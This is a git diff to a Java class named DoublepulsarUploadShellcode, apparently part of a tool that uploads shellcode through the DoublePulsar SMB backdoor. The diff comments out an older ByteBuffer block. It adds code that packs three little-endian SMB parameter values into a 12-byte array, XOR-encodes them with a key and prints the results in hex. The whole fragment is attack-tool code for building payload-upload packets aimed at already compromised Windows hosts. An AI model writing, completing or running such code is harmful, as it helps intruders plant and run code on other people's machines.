@@ -1,4 +1,4 @@
-import java.nio.*;
+import java.nio.*; //import java.nio.ByteBuffer;
 import java.util.*;
 
 
@@ -93,7 +93,7 @@ public class DoublepulsarUploadShellcode {
         int hash = generateProcessHash(procName);
         System.out.printf("Process Hash for %s: 0x%08X%n", procName, hash);
         
-        
+        /*
         ByteBuffer parameters = ByteBuffer.allocate(12);
         parameters.order(ByteOrder.LITTLE_ENDIAN);
 
@@ -113,16 +113,49 @@ public class DoublepulsarUploadShellcode {
         for (byte b : byteArray) {
             System.out.printf("%02X ", b);
         }
-        
-        byte[] XorParameterBytes = byteXor(parameters, byteXorKey);
-        
-        // Print the XORed parameters byte array in hex to verify
-        for (byte b : XorParameterBytes) {
-            System.out.printf("%02X ", XorBytes);
-        }
-        
+        System.out.printf("\n\n");*/
+
+    
         //copy bytebuffer to bytebuffer
         //https://stackoverflow.com/questions/3366925/deep-copy-duplicate-of-javas-bytebuffer
         
+        byte[] Parameters = new byte[12];
+
+        int firstValue = 0x507308; // 0x50D800
+        int secondValue = 4096;
+        int thirdValue = 0;
+
+        // Manually place firstValue in little-endian
+        Parameters[0] = (byte) (firstValue);
+        Parameters[1] = (byte) ((firstValue >> 8) & 0xFF);
+        Parameters[2] = (byte) ((firstValue >> 16) & 0xFF);
+        Parameters[3] = (byte) ((firstValue >> 24) & 0xFF);
+
+        // Manually place secondValue in little-endian
+        Parameters[4] = (byte) (secondValue);
+        Parameters[5] = (byte) ((secondValue >> 8) & 0xFF);
+        Parameters[6] = (byte) ((secondValue >> 16) & 0xFF);
+        Parameters[7] = (byte) ((secondValue >> 24) & 0xFF);
+
+        // Manually place thirdValue in little-endian
+        Parameters[8] = (byte) (thirdValue);
+        Parameters[9] = (byte) ((thirdValue >> 8) & 0xFF);
+        Parameters[10] = (byte) ((thirdValue >> 16) & 0xFF);
+        Parameters[11] = (byte) ((thirdValue >> 24) & 0xFF);
+        
+        System.out.printf("SMB Parameters:  ");
+        // Print the byte array in hex to verify
+        for (byte b : Parameters) {
+            System.out.printf("%02X ", b);
+        }
+        System.out.printf("\n");
+        
+        byte[] XorParameterBytes = byteXor(Parameters, byteXorKey);
+        
+        System.out.printf("XOR SMB Parameters:  ");
+        // Print the XORed parameters byte array in hex to verify
+        for (byte b : XorParameterBytes) {
+            System.out.printf("%02X ", b);
+        }
     }
 }
